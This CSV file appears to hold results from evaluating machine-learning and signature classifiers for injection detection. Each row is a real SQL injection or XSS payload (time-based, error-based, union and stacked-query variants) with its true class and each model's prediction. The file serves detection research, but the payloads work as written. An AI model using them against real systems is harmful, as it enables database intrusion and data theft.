payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (5037=5037",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as dhge where 4816=4816 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('pcim'='pcim",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1';select count(*) from generate_series(1,5000000) and 'fahy' like 'fahy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') where 6045=6045;select (case when (9907=2736) then 9907 else 9907*(select 9907 from mysql.db) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('odkr'='odkr",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'||(select 'ucro' where 9912=9912 and 8594=(select 8594 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5757%"") or 6872=6872 and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%'))) and elt(7425=3843,3843) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' in boolean mode);select (case when (1275=7674) then 1275 else 1275*(select 1275 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as vxkn where 2443=2443 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-8007')) as bgpp where 9555=9555 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-3933%"")) or elt(8142=2978,2978) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1) and (3020=3020)*6703 and (9831=9831,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"";select count(*) from generate_series(1,5000000)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 1096=1096 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as lvbm where 8179=8179;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1))) or elt(6272=6272,sleep(5)) and (((9558=9558",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6766"" where 6591=6591 or make_set(9354=9354,7185)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'kdxg' like 'kdxg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%'))) or 6793=(select 6793 from pg_sleep(5)) and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as dooq where 7911=7911;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-8074') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lnwm'='lnwm,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%' or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5043%'))) union all select 5860,5860,5860,5860,5860#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 2307=2307;select (case when (1946=1302) then 1946 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 4971=4971 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'hhbh'='hhbh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8266%') union all select 8626,8626,8626,8626,8626,8626--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'xpjg' where 3036=3036 and elt(1832=6644,6644))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') as vlwh where 9403=9403 or elt(5873=5873,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2953"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""oaeh""=""oaeh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-6405) as ilah where 5145=5145 union all select 5145,5145,5145,5145,5145--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"";iif(5257=5257,1,1/0)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1)) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((9325=9325",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('yqhk'='yqhk",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1') where 6244=6244 rlike (select * from (select(sleep(5)))sgvo)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9615) as dntk where 4780=4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode);select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2964"")) order by 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)));select pg_sleep(5)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2756' where 6156=6156 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 2070=2070;iif(5257=5257,1,1/0)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) where 9645=9645 union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1425"") where 8056=8056 or elt(1032=1032,3623)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'));begin dbms_lock.sleep(5); end and (('zeyr'='zeyr,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'fpfl' from dual where 1434=1434 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) as popm where 6594=6594 union all select null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as khqq where 3637=3637 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-4595') where 4892=4892 order by 1--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
">""<img src=""livescript:document.cookie=true;"">",xss,0,0,0,xss,xss,xss,xss,xss,xss,xss,xss
"1'+(select 'igoi' where 7823=7823 or 8421=(select count(*) from generate_series(1,5000000)))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) and 8635=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7043"") where 9755=9755 union all select 9755,9755,9755,9755,9755,9755#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select iowv where 6105=6105 and sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) as qort where 1554=1554;waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) union all select null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as bgdm where 3473=3473 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('ajka'='ajka,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-7996"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""iuzv"" like ""iuzv",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'bsbv' from dual where 5276=5276 or (select * from (select(sleep(5)))ydpu))||',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'zoqo' from dual where 2063=2063;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and make_set(6094=2929,2929) and ((('gkyo'='gkyo",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1)) as uvep where 6016=6016 and 6969=(select 6969 from pg_sleep(5))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-3496')) or 9323=9323#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select naiw where 4924=4924;select case when 5346=8272 then 1 else null end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ltym'='ltym",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('zjnp'='zjnp",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-7404' where 1536=1536 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1))) waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7388"") as rlth where 5746=5746 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select xlvq where 7470=7470 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'agng' from dual where 3337=3337 rlike sleep(5))||',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%') union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'mtpt' where 7483=7483 union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1' in boolean mode) or sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('xazf'='xazf,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1%') and 2949=4847 and ('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""ynde""=""ynde",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'+(select gajr where 6653=6653 union all select null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1 and 9122=4153# nxcv,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%"")) union all select null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 8094=8094;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('xtdj'='xtdj",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4453'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('boxt'='boxt",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'+(select 'vwzp' where 2729=2729 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'pmpd' where 9803=9803;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-4979')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('ofgg'='ofgg,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%')));select benchmark(5000000,md5(0x714e4153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('vtoi' like 'vtoi,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") as mszg where 6184=6184 rlike sleep(5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as vbdo where 3882=3882;(select * from (select(sleep(5)))srmq)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7001'+(select slav where 9321=9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""alkz""=""alkz",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"";select (case when (3140=4625) then 1 else 3140*(select 3140 from master..sysdatabases) end)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((9452=9452,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""egxe""=""egxe",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""))) union all select null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5827"") as lskq where 7683=7683 union all select 7683,7683,7683,7683,7683#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') where 5286=5286;select (case when (1123=9550) then 1123 else 1123*(select 1123 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'xdzp' from dual where 5786=5786 and (3020=3020)*6703)||',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select lhtn where 8484=8484 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'||(select 'votg' where 5105=5105 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as pxdq where 2236=2236 and 2006=2006",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") as xioc where 7260=7260 or elt(5873=5873,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) as ztrb where 1052=1052 and (select * from (select(sleep(5)))gcrr)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1 and 8398=1891-- naov,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as sruz where 6318=6318;select (case when (6287=8341) then 6287 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)) as muyz where 6105=6105;begin dbms_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7499%"") union all select 1893,1893,1893,1893,1893#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)));select benchmark(5000000,md5(0x4c4d6142)) and (((9847=9847",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-5903%') union all select 8293,8293,8293,8293,8293,8293,8293,8293#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"exp(~(select * from (select concat(0x7171706a71,(select (elt(1049=1049,1))),0x717a767a71,0x78))x))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(9693=9693,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-6423') or 6872=6872,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"");select case when 7717=7717 then 1 else null end--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- gynj",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")));if(7427=7800) select 7427 else drop function dgir--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as hhly where 2906=2906;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'='fbnx",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'))) and make_set(7539=3946,3946) and ((('qbpo'='qbpo",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9932"" union all select 4049,4049,4049--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) as lejp where 5238=5238 union all select null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (5099=5099",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'vasx' where 4770=4770 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"")) or sleep(5)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 7588=7588 waitfor delay '0:0:5'--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'pzto' from dual where 7338=7338 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9209%""))) union all select 3736,3736,3736--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""rkry"" like ""rkry",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2530%' order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"");begin dbms_lock.sleep(5); end and (""vwbx""=""vwbx",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
